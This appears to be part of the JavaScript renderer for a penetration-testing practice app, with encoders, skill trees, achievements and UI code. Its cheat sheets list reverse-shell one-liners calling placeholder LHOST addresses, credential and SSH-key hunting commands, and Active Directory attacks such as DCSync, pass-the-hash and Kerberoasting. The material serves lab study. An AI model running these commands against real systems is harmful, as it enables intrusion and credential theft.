    a=ii(a,b,c,d,k[8],6,1873313359);d=ii(d,a,b,c,k[15],10,-30611744);c=ii(c,d,a,b,k[6],15,-1560198380);b=ii(b,c,d,a,k[13],21,1309151649);
    a=ii(a,b,c,d,k[4],6,-145523070);d=ii(d,a,b,c,k[11],10,-1120210379);c=ii(c,d,a,b,k[2],15,718787259);b=ii(b,c,d,a,k[9],21,-343485551);
    x[0]=safeAdd(a,x[0]);x[1]=safeAdd(b,x[1]);x[2]=safeAdd(c,x[2]);x[3]=safeAdd(d,x[3]);return x;
  }
  let str = unescape(encodeURIComponent(input));
  const n = str.length;
  const state = [1732584193,-271733879,-1732584194,271733878];
  let i;
  for(i=64;i<=n;i+=64) cycle(state, blk(str.substring(i-64,i)));
  str=str.substring(i-64);
  const tail=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
  for(i=0;i<str.length;i++) tail[i>>2]|=str.charCodeAt(i)<<((i%4)<<3);
  tail[i>>2]|=0x80<<((i%4)<<3);
  if(i>55){cycle(state,tail);tail.fill(0);}
  tail[14]=n*8;
  cycle(state,tail);
  const rhex=n=>{ let s=''; for(let j=0;j<4;j++) s+=('0'+((n>>>(j*8))&0xFF).toString(16)).slice(-2); return s; };
  return state.map(rhex).join('');
}

async function applyEncoderOp(op, input) {
  try {
    switch(op) {
      case 'b64-encode': return btoa(unescape(encodeURIComponent(input)));
      case 'b64-decode': return decodeURIComponent(escape(atob(input)));
      case 'url-encode': return encodeURIComponent(input);
      case 'url-decode': return decodeURIComponent(input);
      case 'html-encode': return _htmlEncode(input);
      case 'html-decode': return _htmlDecode(input);
      case 'hex-encode': return Array.from(new TextEncoder().encode(input)).map(b=>b.toString(16).padStart(2,'0')).join(' ');
      case 'hex-decode': { const hex=input.replace(/\s+/g,''); const bytes=[]; for(let i=0;i<hex.length;i+=2) bytes.push(parseInt(hex.substr(i,2),16)); return new TextDecoder().decode(new Uint8Array(bytes)); }
      case 'rot13': return _rot13(input);
      case 'binary-encode': return Array.from(new TextEncoder().encode(input)).map(b=>b.toString(2).padStart(8,'0')).join(' ');
      case 'binary-decode': { const bits=input.trim().split(/\s+/); return new TextDecoder().decode(new Uint8Array(bits.map(b=>parseInt(b,2)))); }
      case 'decimal-to-hex': return input.trim().split(/\s+/).map(p=>parseInt(p).toString(16).toUpperCase()).join(' ');
      case 'hex-to-decimal': return input.trim().split(/\s+/).map(p=>parseInt(p,16)).join(' ');
      case 'md5': return _md5(input);
      case 'sha1': { const buf=await crypto.subtle.digest('SHA-1',new TextEncoder().encode(input)); return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join(''); }
      case 'sha256': { const buf=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(input)); return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join(''); }
      case 'jwt-decode': {
        const parts=input.split('.');
        if(parts.length!==3) throw new Error('Not a valid JWT');
        const d=(s)=>{ const pad=s.length%4; const padded=s+'===='.slice(0,pad?4-pad:0); return JSON.parse(atob(padded.replace(/-/g,'+').replace(/_/g,'/'))); };
        return `=== HEADER ===\n${JSON.stringify(d(parts[0]),null,2)}\n\n=== PAYLOAD ===\n${JSON.stringify(d(parts[1]),null,2)}\n\n=== SIGNATURE ===\n${parts[2]}`;
      }
      default: throw new Error(`Unknown operation: ${op}`);
    }
  } catch(e) { throw new Error(`${op} failed: ${e.message}`); }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1H — PROGRESS, SKILL TREE, ACHIEVEMENTS  (from progress.js)
// ═══════════════════════════════════════════════════════════════════════════════

const SKILL_TREE = {
  webSecurity:    { label:'Web Security',icon:'🌐', nodes:['SQL Injection','XSS','SSRF','File Upload','Auth Bypass','API Hacking','IDOR','SSTI'], keywords:['sql','xss','ssrf','file upload','auth bypass','api','idor','ssti','web','http','gobuster','ffuf','feroxbuster','nikto','sqlmap','wpscan'] },
  network:        { label:'Network',icon:'📡', nodes:['Port Scanning','Packet Analysis','MITM','Firewall Bypass','VPN/Tunnelling','Cisco/Networking','Protocol Analysis'], keywords:['nmap','masscan','rustscan','pcap','wireshark','tcpdump','mitm','firewall','vpn','tunnel','cisco','port scan','network','snmp','dhcp'] },
  activeDirectory:{ label:'Active Directory',icon:'🏰', nodes:['Kerberoasting','AS-REP Roasting','Pass the Hash','BloodHound','GPO Abuse','DCSync','Silver/Golden Ticket'], keywords:['kerberoast','asrep','pass the hash','bloodhound','gpo','dcsync','golden ticket','silver ticket','active directory','ldap','kerberos','mimikatz','impacket','crackmapexec'] },
  privEsc:        { label:'Privilege Escalation',icon:'⬆️', nodes:['SUID/SGID','Sudo Misconfig','Cron Jobs','PATH Hijacking','Kernel Exploits','Token Impersonation','DLL Hijacking'], keywords:['suid','sgid','sudo','cron','path hijack','kernel exploit','token impersonation','dll hijack','linpeas','winpeas','privilege escalation','privesc','gtfobins'] },
  cryptography:   { label:'Cryptography',icon:'🔐', nodes:['Hash Cracking','Encoding/Decoding','RSA','AES','Classic Ciphers','JWT'], keywords:['hash','crack','hashcat','john','base64','encode','decode','rsa','aes','cipher','jwt','crypto','md5','sha'] },
  forensics:      { label:'Forensics',icon:'🔍', nodes:['File Carving','Steganography','Memory Analysis','Log Analysis','PCAP Analysis'], keywords:['forensic','stego','steganography','volatility','memory','log','pcap','binwalk','strings','file carv','autopsy','wireshark'] },
  reverseEng:     { label:'Reverse Engineering',icon:'⚙️', nodes:['Static Analysis','Dynamic Analysis','Buffer Overflow','ROP Chains','Debugging'], keywords:['reverse','binary','elf','ghidra','ida','gdb','pwndbg','buffer overflow','bof','rop','objdump','radare','pwn'] },
  osint:          { label:'OSINT',icon:'🕵️', nodes:['Username Recon','Metadata','Google Dorking','Social Engineering','Domain Intel'], keywords:['osint','recon','sherlock','theharvester','exiftool','metadata','dork','social engineering','whois','shodan','censys','maltego'] },
};

const ACHIEVEMENTS = [
  {id:'first-blood',    name:'First Blood',         icon:'🩸',description:'Complete your first lab',                              check:s=>s.totalCompleted>=1},
  {id:'script-kiddie',  name:'Script Kiddie No More',icon:'🛠️',description:'Use 10 different tools across sessions',             check:s=>s.uniqueToolsUsed>=10},
  {id:'root-hunter',    name:'Root Hunter',          icon:'👑',description:'Root your first HTB machine',                        check:s=>s.htbRooted>=1},
  {id:'speed-runner',   name:'Speed Runner',         icon:'⚡',description:'Complete a Medium box under 2 hours',               check:s=>s.fastestMedium!==null&&s.fastestMedium<=120},
  {id:'persistence-7',  name:'Persistence',          icon:'🔥',description:'7 day streak',                                       check:s=>s.currentStreak>=7},
  {id:'on-a-roll',      name:'On a Roll',            icon:'🎯',description:'30 day streak',                                      check:s=>s.currentStreak>=30},
  {id:'unstoppable',    name:'Unstoppable',          icon:'🚀',description:'90 day streak',                                      check:s=>s.currentStreak>=90},
  {id:'web-warrior',    name:'Web Warrior',          icon:'🌐',description:'Complete 5 web-focused labs',                        check:s=>s.webLabsCompleted>=5},
  {id:'ad-destroyer',   name:'AD Destroyer',         icon:'🏰',description:'Complete 3 Active Directory labs',                   check:s=>s.adLabsCompleted>=3},
  {id:'flag-collector', name:'Flag Collector',       icon:'🚩',description:'Capture 25 total flags',                             check:s=>s.totalFlags>=25},
  {id:'polyglot',       name:'Polyglot',             icon:'🌍',description:'Complete labs on 3 different platforms',              check:s=>s.platformsUsed>=3},
  {id:'night-owl',      name:'Night Owl',            icon:'🦉',description:'Complete a lab between midnight and 5am',            check:s=>s.nightOwlCount>=1},
  {id:'no-hints',       name:'No Hints Needed',      icon:'🧠',description:'Complete a full lab at hint level 1 throughout',     check:s=>s.noHintCompletions>=1},
  {id:'teach-yourself', name:'Teach Yourself',       icon:'📚',description:'Use Teach Me Mode for an entire session',            check:s=>s.teachMeSessions>=1},
  {id:'clean-method',   name:'Clean Methodology',    icon:'✅',description:'Complete a lab with all phases ticked in order',     check:s=>s.cleanMethodologyCount>=1},
  {id:'speed-demon',    name:'Speed Demon',          icon:'💨',description:'Complete an Easy box under 30 minutes',              check:s=>s.fastestEasy!==null&&s.fastestEasy<=30},
  {id:'encyclopaedia',  name:'Encyclopaedia',        icon:'📖',description:'Unlock 15 skill tree nodes',                        check:s=>s.unlockedNodes>=15},
  {id:'veteran',        name:'Veteran',              icon:'🎖️',description:'Complete 50 labs total',                            check:s=>s.totalCompleted>=50},
];

function computeProgressStats(sessions, streak, skillNodes) {
  const completed = sessions.filter(s=>s.flagsCaptured>0||s.methodologyCompleted.includes('Flag Capture'));
  const uniqueTools = new Set(sessions.flatMap(s=>s.toolsUsed||[]));
  const platforms = new Set(sessions.map(s=>s.platform).filter(Boolean));
  const htbRooted = sessions.filter(s=>s.platform==='HTB'&&(s.flagsCaptured>=2||s.methodologyCompleted.includes('Flag Capture'))).length;
  const medTimes = sessions.filter(s=>s.difficulty==='Medium'&&s.durationMinutes).map(s=>s.durationMinutes);
  const easyTimes = sessions.filter(s=>s.difficulty==='Easy'&&s.durationMinutes).map(s=>s.durationMinutes);
  const allNodes = Object.values(skillNodes).flat();
  const uniqueNodes = new Set(allNodes);
  const platCounts = {};
  sessions.forEach(s=>{ if(s.platform) platCounts[s.platform]=(platCounts[s.platform]||0)+1; });
  const favPlatform = Object.entries(platCounts).sort((a,b)=>b[1]-a[1])[0];
  const hardestByDiff = {Easy:0,Medium:0,Hard:0,Insane:0};
  sessions.forEach(s=>{ if(s.difficulty) hardestByDiff[s.difficulty]++; });
  const hardest = ['Insane','Hard','Medium','Easy'].find(d=>hardestByDiff[d]>0)||null;
  const totalMinutes = sessions.reduce((sum,s)=>sum+(s.durationMinutes||0),0);
  return {
    totalCompleted: completed.length,
    totalSessions: sessions.length,
    currentStreak: streak.current||0,
    longestStreak: streak.longest||0,
    totalTimeMinutes: totalMinutes,
    favouritePlatform: favPlatform?favPlatform[0]:'N/A',
    hardestCompleted: hardest||'N/A',
    totalFlags: sessions.reduce((sum,s)=>sum+(s.flagsCaptured||0),0),
    fastestMedium: medTimes.length?Math.min(...medTimes):null,
    fastestEasy: easyTimes.length?Math.min(...easyTimes):null,
    uniqueToolsUsed: uniqueTools.size,
    htbRooted,
    webLabsCompleted: sessions.filter(s=>s.techniques&&s.techniques.some(t=>['sql','xss','ssrf','web'].some(k=>t.toLowerCase().includes(k)))).length,
    adLabsCompleted: sessions.filter(s=>s.techniques&&s.techniques.some(t=>['active directory','ad','kerberos','bloodhound'].some(k=>t.toLowerCase().includes(k)))).length,
    platformsUsed: platforms.size,
    nightOwlCount: sessions.filter(s=>s.completedHour>=0&&s.completedHour<5).length,
    noHintCompletions: sessions.filter(s=>(s.maxHintLevel||1)<=1&&s.flagsCaptured>0).length,
    teachMeSessions: sessions.filter(s=>s.usedTeachMe).length,
    cleanMethodologyCount: sessions.filter(s=>s.cleanMethodology).length,
    unlockedNodes: uniqueNodes.size,
    platformCounts: platCounts,
    difficultyBreakdown: hardestByDiff,
    sessions,
    skillNodes,
  };
}

function checkAchievements(stats, achievementsData) {
  const newlyUnlocked = [];
  ACHIEVEMENTS.forEach(ach => {
    if(!achievementsData[ach.id] && ach.check(stats)) {
      achievementsData[ach.id] = { unlockedAt: new Date().toISOString() };
      newlyUnlocked.push(ach);
    }
  });
  return newlyUnlocked;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1I — CHEAT SHEETS  (condensed)
// ═══════════════════════════════════════════════════════════════════════════════

const CHEATSHEETS = {
  nmap: { title:'Nmap Flags & Scan Types', sections:[
    { heading:'Scan Types', items:[{flag:'-sS',desc:'SYN stealth scan (root)'},{flag:'-sT',desc:'TCP connect scan'},{flag:'-sU',desc:'UDP scan'},{flag:'-sV',desc:'Version detection'},{flag:'-sC',desc:'Default NSE scripts'},{flag:'-O',desc:'OS detection'},{flag:'-A',desc:'Aggressive (OS+ver+scripts+trace)'}]},
    { heading:'Ports', items:[{flag:'-p-',desc:'All 65535 ports'},{flag:'-p 80,443',desc:'Specific ports'},{flag:'--top-ports 1000',desc:'Top 1000 ports'},{flag:'-F',desc:'Fast scan (top 100)'}]},
    { heading:'Timing', items:[{flag:'-T4',desc:'Aggressive (good default)'},{flag:'-T5',desc:'Insane (fastest)'},{flag:'--min-rate 5000',desc:'Min packets/sec'}]},
    { heading:'Output', items:[{flag:'-oA basename',desc:'All formats'},{flag:'-oN file.txt',desc:'Normal output'},{flag:'--open',desc:'Only open ports'},{flag:'-v / -vv',desc:'Verbosity'}]},
    { heading:'Useful Scripts', items:[{flag:'--script=vuln',desc:'Vulnerability scripts'},{flag:'--script=smb-vuln-ms17-010',desc:'EternalBlue check'},{flag:'--script=http-title',desc:'HTTP page title'},{flag:'--script=ftp-anon',desc:'FTP anonymous login'}]},
    { heading:'Quick Scan Patterns', items:[{flag:'nmap -sV -sC -p- --min-rate 5000 <IP>',desc:'Full port + version + scripts'},{flag:'sudo nmap -A -T4 -p- <IP>',desc:'Aggressive full scan'},{flag:'nmap -sU --top-ports 100 -sV <IP>',desc:'Top 100 UDP ports'}]},
  ]},
  linprivesc: { title:'Linux Privilege Escalation Checklist', sections:[
    { heading:'Basic Recon', items:[{flag:'id && whoami',desc:'Current user and groups'},{flag:'uname -a',desc:'Kernel version'},{flag:'cat /etc/os-release',desc:'OS info'},{flag:'ps aux',desc:'Running processes'},{flag:'netstat -tulpn',desc:'Listening ports'}]},
    { heading:'SUID/SGID', items:[{flag:'find / -perm -4000 -type f 2>/dev/null',desc:'Find SUID binaries'},{flag:'find / -perm -2000 -type f 2>/dev/null',desc:'Find SGID binaries'},{flag:'Check GTFOBins for abuse',desc:'https://gtfobins.github.io'}]},
    { heading:'Sudo', items:[{flag:'sudo -l',desc:'What can current user run as sudo'},{flag:'Check GTFOBins for sudo abuse',desc:'Misconfigs like NOPASSWD'}]},
    { heading:'Cron Jobs', items:[{flag:'cat /etc/crontab',desc:'System cron jobs'},{flag:'ls -la /etc/cron.*',desc:'Cron directories'},{flag:'crontab -l',desc:"Current user's cron"},{flag:'pspy64',desc:'Monitor running processes without root'}]},
    { heading:'Writable Files', items:[{flag:'find / -writable -type f 2>/dev/null | grep -v proc',desc:'Writable files'},{flag:'find / -writable -type d 2>/dev/null',desc:'Writable directories'}]},
    { heading:'Passwords', items:[{flag:'cat /etc/passwd',desc:'User list'},{flag:'cat ~/.bash_history',desc:'Command history'},{flag:'find / -name "*.conf" -readable 2>/dev/null',desc:'Readable config files'},{flag:'find / -name "id_rsa" 2>/dev/null',desc:'SSH private keys'}]},
  ]},
  winprivesc: { title:'Windows Privilege Escalation Checklist', sections:[
    { heading:'Basic Recon', items:[{flag:'whoami /all',desc:'User and all privileges'},{flag:'net user',desc:'Local users'},{flag:'net localgroup administrators',desc:'Local admins'},{flag:'systeminfo',desc:'OS, hotfixes, architecture'}]},
    { heading:'Unquoted Service Paths', items:[{flag:'wmic service get name,displayname,pathname,startmode | findstr /v "C:\\Windows"',desc:'Find unquoted paths'},{flag:'sc qc <service>',desc:'Query service config'}]},
    { heading:'AlwaysInstallElevated', items:[{flag:'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',desc:'Check HKLM'},{flag:'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',desc:'Check HKCU'}]},
    { heading:'Saved Credentials', items:[{flag:'cmdkey /list',desc:'Stored credentials'},{flag:'dir /s /b pass.txt == *cred* == *vnc* == *.config* 2>nul',desc:'Config files with creds'},{flag:'reg query HKLM /f password /t REG_SZ /s',desc:'Registry passwords'}]},
    { heading:'Token Impersonation', items:[{flag:'whoami /priv',desc:'Check SeImpersonatePrivilege'},{flag:'PrintSpoofer / JuicyPotato / GodPotato',desc:'Potato exploits for SeImpersonatePrivilege'}]},
  ]},
  webenum: { title:'Web Enumeration Checklist', sections:[
    { heading:'Initial Recon', items:[{flag:'curl -I http://<IP>',desc:'HTTP headers (server version, tech stack)'},{flag:'curl http://<IP>/robots.txt',desc:'Robots.txt (always check!)'},{flag:'curl http://<IP>/sitemap.xml',desc:'Sitemap'},{flag:'wappalyzer / whatweb',desc:'Technology fingerprinting'}]},
    { heading:'Directory Fuzzing', items:[{flag:'gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt',desc:'Basic dir fuzz'},{flag:'ffuf -u http://<IP>/FUZZ -w <wordlist> -fc 404',desc:'Fast fuzzing with filter'},{flag:'feroxbuster -u http://<IP> -w <wordlist> --auto-tune',desc:'Recursive discovery'}]},
    { heading:'File Extensions', items:[{flag:'-x php,txt,html,bak,old,conf,zip',desc:'Add to gobuster/ffuf'},{flag:'Try .bak, .old, .zip on found files',desc:'Backup file discovery'},{flag:'.git, .svn, .env',desc:'Source control and config exposure'}]},
    { heading:'Virtual Hosts', items:[{flag:'gobuster vhost -u http://<IP> -w subdomains.txt --append-domain',desc:'VHOST brute force'},{flag:'Add found vhosts to /etc/hosts',desc:'Update /etc/hosts file'}]},
    { heading:'Parameter Fuzzing', items:[{flag:'ffuf -u "http://<IP>/page?FUZZ=test" -w params.txt',desc:'Parameter discovery'},{flag:'arjun -u http://<IP>/page',desc:'Parameter finder tool'}]},
  ]},
  adattacks: { title:'Active Directory Attack Checklist', sections:[
    { heading:'Enumeration', items:[{flag:'bloodhound-python -u user -p pass -d CORP.LOCAL -dc <DC> -c all',desc:'BloodHound collection'},{flag:'ldapsearch -H ldap://<DC> -x -b "DC=corp,DC=local"',desc:'LDAP enumeration'},{flag:'enum4linux-ng -A <IP>',desc:'SMB/LDAP enum'}]},
    { heading:'Kerberoasting', items:[{flag:'impacket-GetUserSPNs CORP.LOCAL/user:pass -dc-ip <DC> -request',desc:'Request TGS tickets'},{flag:'hashcat -a 0 -m 13100 hash.txt rockyou.txt',desc:'Crack TGS hash'}]},
    { heading:'AS-REP Roasting', items:[{flag:'impacket-GetNPUsers CORP.LOCAL/ -usersfile users.txt -dc-ip <DC> -no-pass',desc:'Get AS-REP hashes'},{flag:'hashcat -a 0 -m 18200 hash.txt rockyou.txt',desc:'Crack AS-REP hash'}]},
    { heading:'Pass the Hash', items:[{flag:'impacket-psexec CORP.LOCAL/admin@<IP> -hashes :NTLM_HASH',desc:'PTH with psexec'},{flag:'crackmapexec smb <IP> -u admin -H NTLM_HASH',desc:'Verify hash works'}]},
    { heading:'DCSync', items:[{flag:'impacket-secretsdump CORP.LOCAL/admin:pass@<DC>',desc:'Dump all NTLM hashes'},{flag:'mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt',desc:'DCSync with mimikatz'}]},
  ]},
  revshells: { title:'Reverse Shell Quick Reference', sections:[
    { heading:'Bash', items:[{flag:'bash -i >& /dev/tcp/LHOST/LPORT 0>&1',desc:'Standard bash TCP redirect'}]},
    { heading:'Python 3', items:[{flag:'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("bash")\'',desc:'Python3 PTY shell'}]},
    { heading:'PHP', items:[{flag:'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',desc:'PHP one-liner'}]},
    { heading:'PowerShell', items:[{flag:'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'LHOST\',LPORT)..."',desc:'PS reverse shell'}]},
    { heading:'Shell Stabilisation', items:[{flag:'python3 -c \'import pty;pty.spawn("/bin/bash")\'',desc:'Step 1: Spawn PTY'},{flag:'Ctrl+Z  →  stty raw -echo  →  fg',desc:'Step 2: Raw mode'},{flag:'export TERM=xterm; stty rows 40 cols 160',desc:'Step 3: Fix terminal size'}]},
    { heading:'Listener', items:[{flag:'nc -lvnp 4444',desc:'Standard netcat listener'},{flag:'rlwrap nc -lvnp 4444',desc:'With readline support'},{flag:'pwncat-cs -lp 4444',desc:'Pwncat with post-exploit modules'}]},
  ]},
  hashid: { title:'Hash Identification Guide', sections:[
    { heading:'Common Hash Formats', items:[
      {flag:'32 hex chars',desc:'MD5 (hashcat -m 0 / john --format=raw-md5)'},
      {flag:'40 hex chars',desc:'SHA1 (hashcat -m 100)'},
      {flag:'64 hex chars',desc:'SHA256 (hashcat -m 1400)'},
      {flag:'$1$...',desc:'MD5crypt (hashcat -m 500)'},
      {flag:'$5$...',desc:'SHA256crypt (hashcat -m 7400)'},
      {flag:'$6$...',desc:'SHA512crypt (hashcat -m 1800)'},
      {flag:'$2a$ / $2b$',desc:'bcrypt (hashcat -m 3200, slow!)'},
      {flag:'32 hex (Windows)',desc:'NTLM (hashcat -m 1000)'},
      {flag:'user:LM:NT hash',desc:'/etc/shadow NTLM — use NT part'},
      {flag:'$krb5tgs$...',desc:'Kerberoast TGS (hashcat -m 13100)'},
      {flag:'$krb5asrep$...',desc:'AS-REP Roast (hashcat -m 18200)'},
    ]},
    { heading:'Tools', items:[{flag:'hash-identifier <hash>',desc:'Identify hash type'},{flag:'hashid <hash>',desc:'Python hash identifier'},{flag:'hashcat --identify hash.txt',desc:'Hashcat hash identification (v6.2.5+)'}]},
  ]},
};

const PORT_SERVICES = {
  21:'FTP — Unauthenticated access, anonymous login, file upload/download',
  22:'SSH — Brute force, key-based auth bypass, version exploits',
  23:'Telnet — Cleartext credentials, often unpatched',
  25:'SMTP — Email relay, user enumeration (VRFY/EXPN)',
  53:'DNS — Zone transfer (AXFR), subdomain enumeration',
  80:'HTTP — Web app vulnerabilities, directory fuzzing',
  88:'Kerberos — Kerberoasting, AS-REP roasting, ticket attacks',
  110:'POP3 — Email access, credential sniffing',
  111:'RPCbind — NFS enumeration, RPC services',
  135:'MSRPC — Remote procedure calls, Dcom exploits',
  139:'NetBIOS — SMB over NetBIOS, name service enum',
  143:'IMAP — Email access, credential attacks',
  389:'LDAP — Active Directory enumeration, anonymous bind',
  443:'HTTPS — Web app vulnerabilities over TLS',
  445:'SMB — EternalBlue (MS17-010), pass-the-hash, share enum',
  512:'rexec — Remote execution, weak auth',
  513:'rlogin — Remote login, trust relationships',
  514:'rsh — Remote shell, no auth on some configs',
  593:'HTTP RPC — DCOM over HTTP',
  631:'IPP — Printer service, potential RCE',
  873:'rsync — File sync, potential data exposure',
  1433:'MSSQL — Database access, xp_cmdshell RCE',
  1521:'Oracle DB — Database access, default credentials',
  2049:'NFS — Mount remote file systems, check exports',
  2375:'Docker API — Container management, potential RCE',
  3306:'MySQL — Database access, brute force',
  3389:'RDP — Remote desktop, BlueKeep, brute force',
  5432:'PostgreSQL — Database access, COPY TO/FROM PROGRAM',
  5900:'VNC — Remote desktop, weak passwords',
  6379:'Redis — Unauthenticated access, config write, RCE',
  6443:'Kubernetes API — Cluster management, privilege escalation',
  8080:'HTTP Alt — Web app, proxy, admin panels',
  8443:'HTTPS Alt — Web app over TLS',
  8888:'HTTP Alt — Jupyter notebooks, admin panels',
  9200:'Elasticsearch — Unauthenticated access, data exposure',
  27017:'MongoDB — Unauthenticated access, data exposure',
};
// =============================================================================
// RENDERER PART 2 — APP STATE, INIT, SPLASH, WIZARD, TOP BAR, TABS, SESSION, CHAT
// Combine with renderer-part1.js (prepend part1 content before this file)
// =============================================================================

'use strict';

// =============================================================================
// SECTION 2A — APP STATE
// =============================================================================

const AppState = {
  // Tab management
  tabs: [],           // Array of { id, session, chatHistory, pendingImages }
  activeTabId: null,

  // Config & persisted data
  config: {
    apiKey: '',
    obsidianVault: '',
    theme: 'stealth',
    outputDir: '',
    vpnCheckEnabled: true,
    autosaveEnabled: true,
    fontSize: 'medium',
    soundEnabled: true,
    notificationsEnabled: true,
    operatorName: 'ItsEliias',
  },

  // Progress & gamification
  progressData: {
    skillTree: {},    // domain -> { nodes unlocked }
    achievements: [], // array of achieved IDs
    totalXP: 0,
    stats: {},
  },

  // Lab tracker
  labsData: {
    columns: {
      backlog:     { id: 'backlog',     title: 'Backlog',      cards: [] },
      inprogress:  { id: 'inprogress',  title: 'In Progress',  cards: [] },
      completed:   { id: 'completed',   title: 'Completed',    cards: [] },
      abandoned:   { id: 'abandoned',   title: 'Abandoned',    cards: [] },
    }
  },

  // Snippets
  snippetsData: [],

  // Runtime state
  vpnStatus: { connected: false, interface: null },
  isOffline: false,
  focusMode: false,
  apiKeyValid: false,

  // Chart instances
  charts: { radar: null, activity: null },

  // Drag state for kanban
  dragState: { cardId: null, sourceCol: null },

  // Snippet search overlay
  snippetSearchOpen: false,

  // Session list cache
  sessionList: [],

  // Update available
  updateAvailable: false,

  // VPN poll interval
  vpnInterval: null,
};

// =============================================================================
// SECTION 2B — UTILITY HELPERS
// =============================================================================

// ─── Launcher Status Push ─────────────────────────────────────────────────────
// Pushes live CyberLab state to cybertools-config.json so the Launcher card
// shows streak, labsDone, currentLab, sessionStart, and hintLevel.
function pushCyberLabStatus() {
  try {
    const completedCount = (AppState.labsData?.columns?.completed?.cards || []).length;
    const streak = AppState.progressData?.streak?.current ?? 0;

    // Active tab session info
    const activeTab = AppState.tabs.find(t => t.id === AppState.activeTabId);
    const currentLab = activeTab
      ? (activeTab.session?.name || activeTab.session?.labName || activeTab.session?.target || null)
      : null;
    const sessionStart = activeTab?.session?.startTime || null;
    const hintLevel    = activeTab?.hintLevel || null;

    const status = {
      labsDone:    completedCount,
      streak:      streak,
      currentLab:  currentLab,
      sessionStart: sessionStart,
      hintLevel:   hintLevel,
    };

    if (window.electronAPI && window.electronAPI.updateLauncherStatus) {
      window.electronAPI.updateLauncherStatus(status);
    }
  } catch (e) {
    console.warn('[pushCyberLabStatus]', e.message);
  }
}

function $(sel, ctx) { return (ctx || document).querySelector(sel); }
function $$(sel, ctx) { return Array.from((ctx || document).querySelectorAll(sel)); }

function escHtml(str) {
  if (typeof str !== 'string') str = String(str || '');
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function formatDate(ts) {
  if (!ts) return '';
  const d = new Date(ts);
  return d.toLocaleDateString(undefined, { month: 'short', day: 'numeric', year: 'numeric' });
}

function formatTime(ts) {
  if (!ts) return '';
  const d = new Date(ts);
  return d.toLocaleTimeString(undefined, { hour: '2-digit', minute: '2-digit' });
}

function formatDuration(ms) {
  if (!ms || ms < 0) return '0m';
  const h = Math.floor(ms / 3600000);
  const m = Math.floor((ms % 3600000) / 60000);
  if (h > 0) return `${h}h ${m}m`;
  return `${m}m`;
}

function generateId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
}

function showToast(message, type = 'info', duration = 3000) {
  const container = $('#toast-container') || createToastContainer();
  const toast = document.createElement('div');
  toast.className = `toast toast-${type}`;
  toast.textContent = message;
  container.appendChild(toast);
  requestAnimationFrame(() => toast.classList.add('toast-show'));
  setTimeout(() => {
    toast.classList.remove('toast-show');
    setTimeout(() => toast.remove(), 350);
  }, duration);
}

function createToastContainer() {
  const div = document.createElement('div');
  div.id = 'toast-container';
  div.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px;';
  document.body.appendChild(div);
  return div;
}

function showModal(id) {
  const el = $(`#${id}`);
  if (el) { el.classList.add('open'); el.removeAttribute('hidden'); }
}

function hideModal(id) {
  const el = $(`#${id}`);
  if (el) { el.classList.remove('open'); el.setAttribute('hidden', ''); }
}

function setButtonLoading(btn, loading, text) {
  if (!btn) return;
  if (loading) {
    btn.dataset.origText = btn.textContent;
    btn.textContent = text || 'Loading…';
    btn.disabled = true;
  } else {
    btn.textContent = btn.dataset.origText || btn.textContent;
    btn.disabled = false;
  }
}

function copyToClipboard(text, btn) {
  navigator.clipboard.writeText(text).then(() => {
    if (btn) {
      const orig = btn.textContent;
      btn.textContent = 'Copied!';
      setTimeout(() => { btn.textContent = orig; }, 1500);
    }
    showToast('Copied to clipboard', 'success', 1500);
  }).catch(() => showToast('Copy failed', 'error'));
}

// =============================================================================
// SECTION 2C — SPLASH SCREEN
// =============================================================================

function showSplash() {
  const splash = $('#splash');
  if (!splash) return;
  splash.style.display = '';
  splash.classList.remove('fade-out');
}

function hideSplash(callback) {
  const splash = $('#splash');
  if (!splash) { callback && callback(); return; }
  // CSS: #splash.fade-out { opacity: 0; pointer-events: none; }
  splash.classList.add('fade-out');
  setTimeout(() => {
    splash.style.display = 'none';
    callback && callback();
  }, 520);
}

// =============================================================================
// SECTION 2D — SETUP WIZARD
// HTML uses: .wizard-step (shown/hidden via display), .wizard-next, .wizard-back classes
// IDs: #wizard-apikey, #wizard-vault, #browse-vault-btn, #test-api-btn, #wizard-finish
// =============================================================================

let wizardStep = 0;
const WIZARD_TOTAL = 5;

function showWizard() {
  const wizard = $('#setup-wizard');
  if (!wizard) return;
  wizard.classList.add('active');  // CSS: #setup-wizard.active { display: flex }
  wizardStep = 0;
  renderWizardStep();
}

function hideWizard() {
  const wizard = $('#setup-wizard');
  if (wizard) wizard.classList.remove('active');
}

function renderWizardStep() {
  // Show only the current step, hide all others
  $$('.wizard-step').forEach((el, i) => {
    el.style.display = i === wizardStep ? '' : 'none';
  });

  // Wire theme previews when on step 3 (index 3)
  if (wizardStep === 3) wireWizardThemes();
}

function wireWizardThemes() {
  initWizardThemePicker();
}

async function wizardNext() {
  // Step 1 (index 1) — API Key
  if (wizardStep === 1) {
    const input = $('#wizard-apikey');
    const key = input ? input.value.trim() : '';
    if (key) {
      const activeBtn = document.activeElement;
      if (activeBtn) activeBtn.textContent = 'Testing…';
      try {
        const ok = await window.electronAPI.testApiKey(key);
        if (ok) {
          await window.electronAPI.saveApiKey(key);
          AppState.apiKeyValid = true;
          updateApiStatusDot(true);
          showToast('API key verified!', 'success');
        } else {
          showToast('Key invalid — you can fix it later in Settings', 'warning', 4000);
        }
      } catch (e) {
        showToast('Could not verify: ' + e.message, 'error');
      }
      if (activeBtn) activeBtn.textContent = 'Continue →';
    }
  }

